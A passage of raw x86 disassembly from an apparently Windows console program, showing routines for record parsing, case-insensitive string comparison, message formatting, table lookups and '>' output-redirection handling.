  40b1c3:	jns    0x40b1a4
  40b1c5:	dec    edi
  40b1c6:	test   edi,edi
  40b1c8:	jle    0x40b279
  40b1ce:	mov    eax,DWORD PTR [ebp-0x4]
  40b1d1:	movzx  eax,WORD PTR [eax+0x6]
  40b1d5:	push   eax
  40b1d6:	call   DWORD PTR ds:0x413030
  40b1dc:	movzx  eax,ax
  40b1df:	test   eax,eax
  40b1e1:	je     0x40b204
  40b1e3:	sub    eax,0x1
  40b1e6:	mov    DWORD PTR [ebp-0x8],eax
  40b1e9:	js     0x40b204
  40b1eb:	cmp    esi,ebx
  40b1ed:	jae    0x40b204
  40b1ef:	mov    edx,ebx
  40b1f1:	mov    ecx,esi
  40b1f3:	call   0x40b289
  40b1f8:	mov    esi,eax
  40b1fa:	test   esi,esi
  40b1fc:	je     0x40b25d
  40b1fe:	sub    DWORD PTR [ebp-0x8],0x1
  40b202:	jns    0x40b1eb
  40b204:	sub    edi,0x1
  40b207:	je     0x40b279
  40b209:	mov    eax,DWORD PTR [ebp-0x4]
  40b20c:	movzx  eax,WORD PTR [eax+0x8]
  40b210:	push   eax
  40b211:	call   DWORD PTR ds:0x413030
  40b217:	movzx  eax,ax
  40b21a:	test   eax,eax
  40b21c:	je     0x40b23f
  40b21e:	sub    eax,0x1
  40b221:	mov    DWORD PTR [ebp-0x8],eax
  40b224:	js     0x40b23f
  40b226:	cmp    esi,ebx
  40b228:	jae    0x40b23f
  40b22a:	mov    edx,ebx
  40b22c:	mov    ecx,esi
  40b22e:	call   0x40b289
  40b233:	mov    esi,eax
  40b235:	test   esi,esi
  40b237:	je     0x40b25d
  40b239:	sub    DWORD PTR [ebp-0x8],0x1
  40b23d:	jns    0x40b226
  40b23f:	lea    eax,[edi-0x1]
  40b242:	test   eax,eax
  40b244:	je     0x40b279
  40b246:	mov    eax,DWORD PTR [ebp-0x4]
  40b249:	movzx  eax,WORD PTR [eax+0xa]
  40b24d:	push   eax
  40b24e:	call   DWORD PTR ds:0x413030
  40b254:	movzx  edi,ax
  40b257:	test   edi,edi
  40b259:	je     0x40b279
  40b25b:	jmp    0x40b274
  40b25d:	xor    eax,eax
  40b25f:	jmp    0x40b27b
  40b261:	cmp    esi,ebx
  40b263:	jae    0x40b279
  40b265:	mov    edx,ebx
  40b267:	mov    ecx,esi
  40b269:	call   0x40b289
  40b26e:	mov    esi,eax
  40b270:	test   esi,esi
  40b272:	je     0x40b25d
  40b274:	sub    edi,0x1
  40b277:	jns    0x40b261
  40b279:	mov    eax,esi
  40b27b:	pop    edi
  40b27c:	pop    esi
  40b27d:	pop    ebx
  40b27e:	mov    esp,ebp
  40b280:	pop    ebp
  40b281:	ret    0x4
  40b284:	int3   
  40b285:	int3   
  40b286:	int3   
  40b287:	int3   
  40b288:	int3   
  40b289:	mov    edi,edi
  40b28b:	push   esi
  40b28c:	push   edi
  40b28d:	mov    edi,edx
  40b28f:	mov    esi,ecx
  40b291:	call   0x40a099
  40b296:	cmp    eax,0xffffffff
  40b299:	jne    0x40b29f
  40b29b:	xor    eax,eax
  40b29d:	jmp    0x40b2c8
  40b29f:	add    esi,eax
  40b2a1:	lea    eax,[esi+0xa]
  40b2a4:	cmp    eax,edi
  40b2a6:	ja     0x40b29b
  40b2a8:	add    esi,0x8
  40b2ab:	movzx  eax,BYTE PTR [esi]
  40b2ae:	shl    ax,0x8
  40b2b2:	movzx  ecx,ax
  40b2b5:	movzx  eax,BYTE PTR [esi+0x1]
  40b2b9:	or     ecx,eax
  40b2bb:	add    ecx,0x2
  40b2be:	add    ecx,esi
  40b2c0:	cmp    edi,ecx
  40b2c2:	sbb    eax,eax
  40b2c4:	not    eax
  40b2c6:	and    eax,ecx
  40b2c8:	pop    edi
  40b2c9:	pop    esi
  40b2ca:	ret    
  40b2cb:	int3   
  40b2cc:	int3   
  40b2cd:	int3   
  40b2ce:	int3   
  40b2cf:	int3   
  40b2d0:	mov    edi,edi
  40b2d2:	push   esi
  40b2d3:	movzx  esi,BYTE PTR [edx]
  40b2d6:	push   edi
  40b2d7:	mov    edi,ecx
  40b2d9:	movzx  eax,BYTE PTR [edi]
  40b2dc:	mov    al,BYTE PTR [eax+0x411440]
  40b2e2:	cmp    al,BYTE PTR [esi+0x411440]
  40b2e8:	jne    0x40b306
  40b2ea:	mov    al,BYTE PTR [edi]
  40b2ec:	inc    edx
  40b2ed:	inc    edi
  40b2ee:	test   al,al
  40b2f0:	je     0x40b31f
  40b2f2:	movzx  eax,BYTE PTR [edi]
  40b2f5:	movzx  ecx,BYTE PTR [edx]
  40b2f8:	mov    al,BYTE PTR [eax+0x411440]
  40b2fe:	cmp    al,BYTE PTR [ecx+0x411440]
  40b304:	je     0x40b2ea
  40b306:	movzx  eax,BYTE PTR [edx]
  40b309:	movzx  ecx,BYTE PTR [eax+0x411440]
  40b310:	movzx  eax,BYTE PTR [edi]
  40b313:	movzx  eax,BYTE PTR [eax+0x411440]
  40b31a:	sub    eax,ecx
  40b31c:	pop    edi
  40b31d:	pop    esi
  40b31e:	ret    
  40b31f:	xor    eax,eax
  40b321:	jmp    0x40b31c
  40b323:	int3   
  40b324:	int3   
  40b325:	int3   
  40b326:	int3   
  40b327:	int3   
  40b328:	mov    edi,edi
  40b32a:	push   ebp
  40b32b:	mov    ebp,esp
  40b32d:	push   ecx
  40b32e:	push   ecx
  40b32f:	lea    eax,[ebp+0x10]
  40b332:	mov    DWORD PTR [ebp-0x8],eax
  40b335:	lea    eax,[ebp-0x8]
  40b338:	push   eax
  40b339:	push   0x0
  40b33b:	lea    eax,[ebp-0x4]
  40b33e:	push   eax
  40b33f:	push   0x400
  40b344:	push   DWORD PTR [ebp+0xc]
  40b347:	push   0x0
  40b349:	push   0x900
  40b34e:	call   DWORD PTR ds:0x4130a0
  40b354:	test   eax,eax
  40b356:	je     0x40b39c
  40b358:	push   esi
  40b359:	mov    esi,DWORD PTR [ebp-0x4]
  40b35c:	lea    ecx,[esi+0x1]
  40b35f:	mov    al,BYTE PTR [esi]
  40b361:	inc    esi
  40b362:	test   al,al
  40b364:	jne    0x40b35f
  40b366:	sub    esi,ecx
  40b368:	call   0x40d3aa
  40b36d:	test   al,al
  40b36f:	je     0x40b37e
  40b371:	push   esi
  40b372:	push   DWORD PTR [ebp-0x4]
  40b375:	push   DWORD PTR [ebp-0x4]
  40b378:	call   DWORD PTR ds:0x414000
  40b37e:	push   esi
  40b37f:	push   DWORD PTR [ebp-0x4]
  40b382:	push   DWORD PTR [ebp+0x8]
  40b385:	call   DWORD PTR ds:0x413110
  40b38b:	add    esp,0xc
  40b38e:	mov    esi,eax
  40b390:	push   DWORD PTR [ebp-0x4]
  40b393:	call   DWORD PTR ds:0x41308c
  40b399:	mov    eax,esi
  40b39b:	pop    esi
  40b39c:	mov    esp,ebp
  40b39e:	pop    ebp
  40b39f:	ret    
  40b3a0:	int3   
  40b3a1:	int3   
  40b3a2:	int3   
  40b3a3:	int3   
  40b3a4:	int3   
  40b3a5:	mov    edi,edi
  40b3a7:	push   ebp
  40b3a8:	mov    ebp,esp
  40b3aa:	mov    eax,ecx
  40b3ac:	xor    ecx,ecx
  40b3ae:	mul    edx
  40b3b0:	push   esi
  40b3b1:	mov    esi,eax
  40b3b3:	cmp    edx,ecx
  40b3b5:	ja     0x40b3c5
  40b3b7:	jb     0x40b3be
  40b3b9:	cmp    esi,0xffffffff
  40b3bc:	ja     0x40b3c5
  40b3be:	mov    eax,DWORD PTR [ebp+0x8]
  40b3c1:	mov    DWORD PTR [eax],esi
  40b3c3:	jmp    0x40b3d0
  40b3c5:	mov    eax,DWORD PTR [ebp+0x8]
  40b3c8:	mov    ecx,0x80070216
  40b3cd:	or     DWORD PTR [eax],0xffffffff
  40b3d0:	mov    eax,ecx
  40b3d2:	pop    esi
  40b3d3:	pop    ebp
  40b3d4:	ret    0x4
  40b3d7:	int3   
  40b3d8:	int3   
  40b3d9:	int3   
  40b3da:	int3   
  40b3db:	int3   
  40b3dc:	mov    edi,edi
  40b3de:	push   ebp
  40b3df:	mov    ebp,esp
  40b3e1:	push   ecx
  40b3e2:	push   esi
  40b3e3:	xor    esi,esi
  40b3e5:	test   ecx,ecx
  40b3e7:	js     0x40b418
  40b3e9:	test   edx,edx
  40b3eb:	js     0x40b418
  40b3ed:	lea    eax,[ebp-0x4]
  40b3f0:	push   eax
  40b3f1:	call   0x40b3a5
  40b3f6:	test   eax,eax
  40b3f8:	jne    0x40b418
  40b3fa:	push   DWORD PTR [ebp-0x4]
  40b3fd:	call   DWORD PTR ds:0x4131a4
  40b403:	mov    esi,eax
  40b405:	pop    ecx
  40b406:	test   esi,esi
  40b408:	je     0x40b418
  40b40a:	push   DWORD PTR [ebp-0x4]
  40b40d:	push   0x0
  40b40f:	push   esi
  40b410:	call   0x40d4a8
  40b415:	add    esp,0xc
  40b418:	mov    eax,esi
  40b41a:	pop    esi
  40b41b:	mov    esp,ebp
  40b41d:	pop    ebp
  40b41e:	ret    
  40b41f:	int3   
  40b420:	int3   
  40b421:	int3   
  40b422:	int3   
  40b423:	int3   
  40b424:	mov    edi,edi
  40b426:	push   ebp
  40b427:	mov    ebp,esp
  40b429:	push   ecx
  40b42a:	push   ebx
  40b42b:	push   esi
  40b42c:	push   edi
  40b42d:	push   edx
  40b42e:	mov    esi,ecx
  40b430:	call   0x40b9a5
  40b435:	mov    edi,DWORD PTR [ebp+0x8]
  40b438:	push   DWORD PTR [edi]
  40b43a:	push   eax
  40b43b:	push   0x403bd0
  40b440:	push   esi
  40b441:	call   DWORD PTR ds:0x413190
  40b447:	mov    eax,DWORD PTR [edi+0x8]
  40b44a:	add    esp,0x14
  40b44d:	test   eax,eax
  40b44f:	je     0x40b4ca
  40b451:	cmp    DWORD PTR [eax+0x4],0x1
  40b455:	jbe    0x40b45e
  40b457:	push   0x403bdc
  40b45c:	jmp    0x40b463
  40b45e:	push   0x403be8
  40b463:	push   esi
  40b464:	call   DWORD PTR ds:0x413190
  40b46a:	mov    eax,DWORD PTR [edi+0x8]
  40b46d:	xor    ebx,ebx
  40b46f:	pop    ecx
  40b470:	pop    ecx
  40b471:	cmp    DWORD PTR [eax+0x4],ebx
  40b474:	jbe    0x40b4ca
  40b476:	xor    ecx,ecx
  40b478:	mov    DWORD PTR [ebp-0x4],ecx
  40b47b:	test   ebx,ebx
  40b47d:	je     0x40b490
  40b47f:	push   0x403bf4
  40b484:	push   esi
  40b485:	call   DWORD PTR ds:0x413190
  40b48b:	pop    ecx
  40b48c:	pop    ecx
  40b48d:	mov    ecx,DWORD PTR [ebp-0x4]
  40b490:	mov    eax,DWORD PTR [edi+0x8]
  40b493:	add    eax,0x20
  40b496:	add    ecx,eax
  40b498:	call   0x40c4dc
  40b49d:	test   eax,eax
  40b49f:	jne    0x40b4a6
  40b4a1:	mov    eax,0x4035c0
  40b4a6:	push   eax
  40b4a7:	push   0x20
  40b4a9:	push   0x403bf8
  40b4ae:	push   esi
  40b4af:	call   DWORD PTR ds:0x413190
  40b4b5:	mov    eax,DWORD PTR [edi+0x8]
  40b4b8:	add    esp,0x10
  40b4bb:	mov    ecx,DWORD PTR [ebp-0x4]
  40b4be:	inc    ebx
  40b4bf:	add    ecx,0x40
  40b4c2:	mov    DWORD PTR [ebp-0x4],ecx
  40b4c5:	cmp    ebx,DWORD PTR [eax+0x4]
  40b4c8:	jb     0x40b47b
  40b4ca:	cmp    DWORD PTR [edi+0x4],0x0
  40b4ce:	je     0x40b523
  40b4d0:	push   0x403c00
  40b4d5:	push   esi
  40b4d6:	call   DWORD PTR ds:0x413190
  40b4dc:	mov    ebx,DWORD PTR [edi+0x4]
  40b4df:	xor    eax,eax
  40b4e1:	pop    ecx
  40b4e2:	pop    ecx
  40b4e3:	test   ebx,ebx
  40b4e5:	jmp    0x40b51e
  40b4e7:	mov    ecx,DWORD PTR [ebx]
  40b4e9:	test   ecx,ecx
  40b4eb:	je     0x40b523
  40b4ed:	cmp    BYTE PTR [ecx],0x0
  40b4f0:	je     0x40b523
  40b4f2:	test   eax,eax
  40b4f4:	je     0x40b504
  40b4f6:	push   0x403bf4
  40b4fb:	push   esi
  40b4fc:	call   DWORD PTR ds:0x413190
  40b502:	pop    ecx
  40b503:	pop    ecx
  40b504:	push   DWORD PTR [ebx]
  40b506:	push   0x20
  40b508:	push   0x403bf8
  40b50d:	push   esi
  40b50e:	call   DWORD PTR ds:0x413190
  40b514:	mov    eax,DWORD PTR [ebp-0x4]
  40b517:	add    esp,0x10
  40b51a:	inc    eax
  40b51b:	add    ebx,0x4
  40b51e:	mov    DWORD PTR [ebp-0x4],eax
  40b521:	jne    0x40b4e7
  40b523:	cmp    DWORD PTR [edi+0xc],0x0
  40b527:	je     0x40b62a
  40b52d:	push   0x403c0c
  40b532:	push   esi
  40b533:	call   DWORD PTR ds:0x413190
  40b539:	mov    edi,DWORD PTR [edi+0xc]
  40b53c:	jmp    0x40b61e
  40b541:	push   DWORD PTR [eax]
  40b543:	push   0x403c1c
  40b548:	push   esi
  40b549:	call   DWORD PTR ds:0x413190
  40b54f:	mov    eax,DWORD PTR [edi]
  40b551:	add    esp,0xc
  40b554:	mov    eax,DWORD PTR [eax+0x8]
  40b557:	test   eax,eax
  40b559:	je     0x40b5ba
  40b55b:	xor    ebx,ebx
  40b55d:	cmp    DWORD PTR [eax+0x4],ebx
  40b560:	jbe    0x40b5ba
  40b562:	xor    ecx,ecx
  40b564:	mov    DWORD PTR [ebp-0x4],ecx
  40b567:	test   ebx,ebx
  40b569:	je     0x40b57c
  40b56b:	push   0x403bf4
  40b570:	push   esi
  40b571:	call   DWORD PTR ds:0x413190
  40b577:	pop    ecx
  40b578:	pop    ecx
  40b579:	mov    ecx,DWORD PTR [ebp-0x4]
  40b57c:	mov    eax,DWORD PTR [edi]
  40b57e:	mov    eax,DWORD PTR [eax+0x8]
  40b581:	add    eax,0x20
  40b584:	add    ecx,eax
  40b586:	call   0x40c4dc
  40b58b:	test   eax,eax
  40b58d:	jne    0x40b594
  40b58f:	mov    eax,0x4035c0
  40b594:	push   eax
  40b595:	push   0x20
  40b597:	push   0x403bf8
  40b59c:	push   esi
  40b59d:	call   DWORD PTR ds:0x413190
  40b5a3:	mov    eax,DWORD PTR [edi]
  40b5a5:	add    esp,0x10
  40b5a8:	mov    ecx,DWORD PTR [ebp-0x4]
  40b5ab:	inc    ebx
  40b5ac:	add    ecx,0x40
  40b5af:	mov    DWORD PTR [ebp-0x4],ecx
  40b5b2:	mov    eax,DWORD PTR [eax+0x8]
  40b5b5:	cmp    ebx,DWORD PTR [eax+0x4]
  40b5b8:	jb     0x40b567
  40b5ba:	push   0x403bf4
  40b5bf:	push   esi
  40b5c0:	call   DWORD PTR ds:0x413190
  40b5c6:	mov    eax,DWORD PTR [edi]
  40b5c8:	pop    ecx
  40b5c9:	pop    ecx
  40b5ca:	xor    ecx,ecx
  40b5cc:	mov    ebx,DWORD PTR [eax+0x4]
  40b5cf:	test   ebx,ebx
  40b5d1:	jmp    0x40b60a
  40b5d3:	mov    eax,DWORD PTR [ebx]
  40b5d5:	test   eax,eax
  40b5d7:	je     0x40b60f
  40b5d9:	cmp    BYTE PTR [eax],0x0
  40b5dc:	je     0x40b60f
  40b5de:	test   ecx,ecx
  40b5e0:	je     0x40b5f0
  40b5e2:	push   0x403bf4
  40b5e7:	push   esi
  40b5e8:	call   DWORD PTR ds:0x413190
  40b5ee:	pop    ecx
  40b5ef:	pop    ecx
  40b5f0:	push   DWORD PTR [ebx]
  40b5f2:	push   0x20
  40b5f4:	push   0x403bf8
  40b5f9:	push   esi
  40b5fa:	call   DWORD PTR ds:0x413190
  40b600:	mov    ecx,DWORD PTR [ebp-0x4]
  40b603:	add    esp,0x10
  40b606:	inc    ecx
  40b607:	add    ebx,0x4
  40b60a:	mov    DWORD PTR [ebp-0x4],ecx
  40b60d:	jne    0x40b5d3
  40b60f:	push   0x402a34
  40b614:	push   esi
  40b615:	call   DWORD PTR ds:0x413190
  40b61b:	add    edi,0x4
  40b61e:	mov    eax,DWORD PTR [edi]
  40b620:	pop    ecx
  40b621:	pop    ecx
  40b622:	test   eax,eax
  40b624:	jne    0x40b541
  40b62a:	push   0x403c24
  40b62f:	push   esi
  40b630:	call   DWORD PTR ds:0x413190
  40b636:	pop    ecx
  40b637:	pop    ecx
  40b638:	pop    edi
  40b639:	pop    esi
  40b63a:	pop    ebx
  40b63b:	mov    esp,ebp
  40b63d:	pop    ebp
  40b63e:	ret    0x4
  40b641:	int3   
  40b642:	int3   
  40b643:	int3   
  40b644:	int3   
  40b645:	int3   
  40b646:	mov    edi,edi
  40b648:	push   ebx
  40b649:	push   esi
  40b64a:	push   edi
  40b64b:	push   0x3e
  40b64d:	push   ecx
  40b64e:	mov    ebx,edx
  40b650:	xor    edi,edi
  40b652:	call   DWORD PTR ds:0x4130f0
  40b658:	mov    esi,eax
  40b65a:	pop    ecx
  40b65b:	pop    ecx
  40b65c:	test   esi,esi
  40b65e:	je     0x40b6b4
  40b660:	cmp    BYTE PTR [esi+0x1],0x3e
  40b664:	push   0x100
  40b669:	push   ebx
  40b66a:	jne    0x40b687
  40b66c:	push   0x403c28
  40b671:	push   esi
  40b672:	call   DWORD PTR ds:0x4131a8
  40b678:	add    esp,0x10
  40b67b:	cmp    eax,0x1
  40b67e:	jne    0x40b6b2
  40b680:	push   0x403c30
  40b685:	jmp    0x40b6a0
  40b687:	push   0x403c34
  40b68c:	push   esi
  40b68d:	call   DWORD PTR ds:0x4131a8
  40b693:	add    esp,0x10
  40b696:	cmp    eax,0x1
  40b699:	jne    0x40b6b2
  40b69b:	push   0x403c3c
  40b6a0:	push   ebx
  40b6a1:	call   DWORD PTR ds:0x413104
  40b6a7:	mov    edi,eax
  40b6a9:	pop    ecx
  40b6aa:	pop    ecx
  40b6ab:	test   edi,edi
  40b6ad:	je     0x40b6b2
  40b6af:	mov    BYTE PTR [esi],0x0
  40b6b2:	mov    eax,edi
  40b6b4:	pop    edi
  40b6b5:	pop    esi
  40b6b6:	pop    ebx
  40b6b7:	ret    0x4
  40b6ba:	int3   
  40b6bb:	int3   
  40b6bc:	int3   
  40b6bd:	int3   
  40b6be:	int3   
  40b6bf:	cmp    ecx,0x1
  40b6c2:	jg     0x40b70d
  40b6c4:	je     0x40b707
  40b6c6:	cmp    ecx,0xfffffffb
  40b6c9:	je     0x40b701
  40b6cb:	cmp    ecx,0xfffffffc
  40b6ce:	je     0x40b6fb
  40b6d0:	cmp    ecx,0xfffffffd
  40b6d3:	je     0x40b6f5
  40b6d5:	cmp    ecx,0xfffffffe
  40b6d8:	je     0x40b6ef
  40b6da:	cmp    ecx,0xffffffff
  40b6dd:	je     0x40b6e9
  40b6df:	test   ecx,ecx
  40b6e1:	jne    0x40b727
  40b6e3:	mov    eax,0x403c40
  40b6e8:	ret    
  40b6e9:	mov    eax,0x403ca8
  40b6ee:	ret    
  40b6ef:	mov    eax,0x403cb4
  40b6f4:	ret    
  40b6f5:	mov    eax,0x403cc4
  40b6fa:	ret    
  40b6fb:	mov    eax,0x403cd8
  40b700:	ret    
  40b701:	mov    eax,0x403cf4
  40b706:	ret    
  40b707:	mov    eax,0x403c48
  40b70c:	ret    
  40b70d:	dec    ecx
  40b70e:	sub    ecx,0x1
  40b711:	je     0x40b745
  40b713:	sub    ecx,0x1
  40b716:	je     0x40b73f
  40b718:	sub    ecx,0x1
  40b71b:	je     0x40b739
  40b71d:	sub    ecx,0x1
  40b720:	je     0x40b733
  40b722:	sub    ecx,0xa
  40b725:	je     0x40b72d
  40b727:	mov    eax,0x403d0c
  40b72c:	ret    
  40b72d:	mov    eax,0x403c9c
  40b732:	ret    
  40b733:	mov    eax,0x403c8c
  40b738:	ret    
  40b739:	mov    eax,0x403c7c
  40b73e:	ret    
  40b73f:	mov    eax,0x403c68
  40b744:	ret    
  40b745:	mov    eax,0x403c58
  40b74a:	ret    
  40b74b:	int3   
  40b74c:	int3   
  40b74d:	int3   
  40b74e:	int3   
  40b74f:	int3   
  40b750:	mov    edi,edi
  40b752:	push   ebp
  40b753:	mov    ebp,esp
  40b755:	push   ecx
  40b756:	push   esi
  40b757:	push   edi
  40b758:	mov    edi,DWORD PTR ds:0x40e118
  40b75e:	mov    edx,0x4035c8
  40b763:	mov    esi,ecx
  40b765:	call   0x40b2d0
  40b76a:	test   eax,eax
  40b76c:	jne    0x40b771
  40b76e:	inc    eax
  40b76f:	jmp    0x40b7db
  40b771:	mov    edx,0x403d1c
  40b776:	mov    ecx,esi
  40b778:	call   0x40b2d0
  40b77d:	test   eax,eax
  40b77f:	je     0x40b7d8
  40b781:	mov    edx,0x4035d4
  40b786:	mov    ecx,esi
  40b788:	call   0x40b2d0
  40b78d:	test   eax,eax
  40b78f:	je     0x40b7d8
  40b791:	mov    edx,0x4035cc
  40b796:	mov    ecx,esi
  40b798:	call   0x40b2d0
  40b79d:	test   eax,eax
  40b79f:	jne    0x40b7a5
  40b7a1:	push   0x3
  40b7a3:	jmp    0x40b7da
  40b7a5:	mov    edx,0x4035d8
  40b7aa:	mov    ecx,esi
  40b7ac:	call   0x40b2d0
  40b7b1:	test   eax,eax
  40b7b3:	jne    0x40b7bc
  40b7b5:	mov    eax,0xff
  40b7ba:	jmp    0x40b7db
  40b7bc:	push   esi
  40b7bd:	push   0x403d24
  40b7c2:	push   0x2
  40b7c4:	call   0x40d391
  40b7c9:	pop    ecx
  40b7ca:	push   eax
  40b7cb:	call   DWORD PTR ds:0x413190
  40b7d1:	add    esp,0xc
  40b7d4:	mov    eax,edi
  40b7d6:	jmp    0x40b7db
  40b7d8:	push   0x4
  40b7da:	pop    eax
  40b7db:	pop    edi
  40b7dc:	pop    esi
  40b7dd:	mov    esp,ebp
  40b7df:	pop    ebp
  40b7e0:	ret    
  40b7e1:	int3   
  40b7e2:	int3   
  40b7e3:	int3   
  40b7e4:	int3   
  40b7e5:	int3   
  40b7e6:	mov    edi,edi
  40b7e8:	push   ebp
  40b7e9:	mov    ebp,esp
  40b7eb:	push   ecx
  40b7ec:	mov    eax,ds:0x411544
  40b7f1:	push   ebx
  40b7f2:	push   esi
  40b7f3:	push   edi
  40b7f4:	xor    edi,edi
  40b7f6:	mov    DWORD PTR [ebp-0x4],edx
  40b7f9:	mov    ebx,ecx
  40b7fb:	test   eax,eax
  40b7fd:	je     0x40b81b
  40b7ff:	mov    esi,0x411544
  40b804:	mov    edx,eax
  40b806:	mov    ecx,ebx
  40b808:	call   0x40b2d0
  40b80d:	test   eax,eax
  40b80f:	je     0x40b83d
  40b811:	add    esi,0xc
  40b814:	inc    edi
  40b815:	mov    eax,DWORD PTR [esi]
  40b817:	test   eax,eax
  40b819:	jne    0x40b804
  40b81b:	push   ebx
  40b81c:	push   0x403d40
  40b821:	push   0x2
  40b823:	call   0x40d391
  40b828:	pop    ecx
  40b829:	push   eax
  40b82a:	call   DWORD PTR ds:0x413190
  40b830:	mov    eax,DWORD PTR [ebp-0x4]
  40b833:	add    esp,0xc
  40b836:	pop    edi
  40b837:	pop    esi
  40b838:	pop    ebx
  40b839:	mov    esp,ebp
  40b83b:	pop    ebp
  40b83c:	ret    
  40b83d:	imul   eax,edi,0xc
  40b840:	movzx  eax,WORD PTR [eax+0x411540]
  40b847:	jmp    0x40b836
  40b849:	int3   
  40b84a:	int3   
  40b84b:	int3   
  40b84c:	int3   
  40b84d:	int3   
  40b84e:	mov    edi,edi
  40b850:	push   ebp
  40b851:	mov    ebp,esp
  40b853:	push   ecx
  40b854:	movzx  eax,WORD PTR ds:0x411540
  40b85b:	xor    ecx,ecx
  40b85d:	push   esi
  40b85e:	mov    esi,DWORD PTR ds:0x40e11c
  40b864:	test   ax,ax
  40b867:	je     0x40b881
  40b869:	mov    edx,0x411540
  40b86e:	movzx  eax,ax
  40b871:	cmp    eax,esi
  40b873:	je     0x40b89f
  40b875:	add    edx,0xc
  40b878:	inc    ecx
  40b879:	movzx  eax,WORD PTR [edx]
  40b87c:	test   ax,ax
  40b87f:	jne    0x40b86e
  40b881:	push   esi
  40b882:	push   0x4033ac
  40b887:	push   0x14
  40b889:	mov    esi,0x411f98
  40b88e:	push   esi
  40b88f:	call   DWORD PTR ds:0x413128
  40b895:	add    esp,0x10
  40b898:	mov    eax,esi
  40b89a:	pop    esi
  40b89b:	mov    esp,ebp
  40b89d:	pop    ebp
  40b89e:	ret    
  40b89f:	imul   eax,ecx,0xc
  40b8a2:	mov    eax,DWORD PTR [eax+0x411548]
  40b8a8:	jmp    0x40b89a
  40b8aa:	int3   
  40b8ab:	int3   
  40b8ac:	int3   
  40b8ad:	int3   
  40b8ae:	int3   
  40b8af:	movzx  eax,WORD PTR ds:0x411540
  40b8b6:	xor    edx,edx
  40b8b8:	push   esi
  40b8b9:	test   ax,ax
  40b8bc:	je     0x40b8d6
  40b8be:	mov    esi,0x411540
  40b8c3:	movzx  eax,ax
  40b8c6:	cmp    eax,ecx
  40b8c8:	je     0x40b8f1
  40b8ca:	add    esi,0xc
  40b8cd:	inc    edx
  40b8ce:	movzx  eax,WORD PTR [esi]
  40b8d1:	test   ax,ax
  40b8d4:	jne    0x40b8c3
  40b8d6:	push   ecx
  40b8d7:	push   0x4033ac
  40b8dc:	push   0x14
  40b8de:	mov    esi,0x411f98
  40b8e3:	push   esi
  40b8e4:	call   DWORD PTR ds:0x413128
  40b8ea:	add    esp,0x10
  40b8ed:	mov    eax,esi
  40b8ef:	pop    esi
  40b8f0:	ret    
  40b8f1:	imul   eax,edx,0xc
  40b8f4:	pop    esi
  40b8f5:	mov    eax,DWORD PTR [eax+0x411544]
  40b8fb:	ret    
  40b8fc:	int3   
  40b8fd:	int3   
  40b8fe:	int3   
  40b8ff:	int3   
  40b900:	int3   
  40b901:	movzx  eax,WORD PTR ds:0x4117a0
  40b908:	xor    edx,edx
  40b90a:	push   esi
  40b90b:	test   ax,ax
  40b90e:	je     0x40b928
  40b910:	mov    esi,0x4117a0
  40b915:	movzx  eax,ax
  40b918:	cmp    eax,ecx
  40b91a:	je     0x40b943
  40b91c:	add    esi,0xc
  40b91f:	inc    edx
  40b920:	movzx  eax,WORD PTR [esi]
  40b923:	test   ax,ax
  40b926:	jne    0x40b915
  40b928:	push   ecx
  40b929:	push   0x4033ac
  40b92e:	push   0x14
  40b930:	mov    esi,0x411f98
  40b935:	push   esi
  40b936:	call   DWORD PTR ds:0x413128
  40b93c:	add    esp,0x10
  40b93f:	mov    eax,esi
  40b941:	pop    esi
  40b942:	ret    
  40b943:	imul   eax,edx,0xc
  40b946:	pop    esi
  40b947:	mov    eax,DWORD PTR [eax+0x4117a4]
  40b94d:	ret    
  40b94e:	int3   
  40b94f:	int3   
  40b950:	int3   
  40b951:	int3   
  40b952:	int3   
  40b953:	movzx  eax,WORD PTR ds:0x411760
  40b95a:	xor    edx,edx
  40b95c:	push   esi
  40b95d:	test   ax,ax
  40b960:	je     0x40b97a
  40b962:	mov    esi,0x411760
  40b967:	movzx  eax,ax
  40b96a:	cmp    eax,ecx
  40b96c:	je     0x40b995
  40b96e:	add    esi,0xc
  40b971:	inc    edx
  40b972:	movzx  eax,WORD PTR [esi]
  40b975:	test   ax,ax
  40b978:	jne    0x40b967
  40b97a:	push   ecx
  40b97b:	push   0x4033ac
  40b980:	push   0x14
  40b982:	mov    esi,0x411f98
  40b987:	push   esi
  40b988:	call   DWORD PTR ds:0x413128
  40b98e:	add    esp,0x10
  40b991:	mov    eax,esi
  40b993:	pop    esi
  40b994:	ret    
  40b995:	imul   eax,edx,0xc
  40b998:	pop    esi
  40b999:	mov    eax,DWORD PTR [eax+0x411764]
  40b99f:	ret    
  40b9a0:	int3   
  40b9a1:	int3   
  40b9a2:	int3   
  40b9a3:	int3   
  40b9a4:	int3   
  40b9a5:	mov    edi,edi
  40b9a7:	push   ebp
  40b9a8:	mov    ebp,esp
  40b9aa:	push   ecx
  40b9ab:	push   ecx
  40b9ac:	lea    eax,[ebp+0xc]
  40b9af:	xor    ecx,ecx
  40b9b1:	mov    DWORD PTR [ebp-0x4],eax
  40b9b4:	lea    eax,[ebp-0x4]
  40b9b7:	push   eax
  40b9b8:	push   ecx
  40b9b9:	lea    eax,[ebp-0x8]
  40b9bc:	push   eax
  40b9bd:	push   ecx
  40b9be:	push   DWORD PTR [ebp+0x8]
  40b9c1:	push   ecx
  40b9c2:	push   0x900
  40b9c7:	call   DWORD PTR ds:0x4130a0
  40b9cd:	neg    eax
  40b9cf:	sbb    eax,eax
  40b9d1:	and    eax,DWORD PTR [ebp-0x8]
  40b9d4:	mov    esp,ebp
  40b9d6:	pop    ebp
  40b9d7:	ret    
  40b9d8:	int3   
  40b9d9:	int3   
  40b9da:	int3   
  40b9db:	int3   
  40b9dc:	int3   
  40b9dd:	mov    edi,edi
  40b9df:	push   ebp
  40b9e0:	mov    ebp,esp
  40b9e2:	sub    esp,0x28
  40b9e5:	push   esi
  40b9e6:	push   edi
  40b9e7:	xor    eax,eax
  40b9e9:	xor    edi,edi
  40b9eb:	mov    WORD PTR [ebp-0x8],ax
  40b9ef:	mov    esi,ecx
  40b9f1:	push   edx
  40b9f2:	lea    eax,[ebp-0x10]
  40b9f5:	mov    DWORD PTR [ebp-0x6],edi
  40b9f8:	push   eax
  40b9f9:	mov    WORD PTR [ebp-0x2],di
  40b9fd:	call   DWORD PTR ds:0x4131dc
  40ba03:	push   0x1
  40ba05:	lea    eax,[ebp-0x10]
  40ba08:	push   eax
  40ba09:	lea    eax,[ebp-0x8]
  40ba0c:	push   eax
  40ba0d:	call   DWORD PTR ds:0x4131ec
  40ba13:	lea    eax,[ebp-0x8]
  40ba16:	mov    DWORD PTR [ebp-0x28],0x18
  40ba1d:	mov    DWORD PTR [ebp-0x20],eax
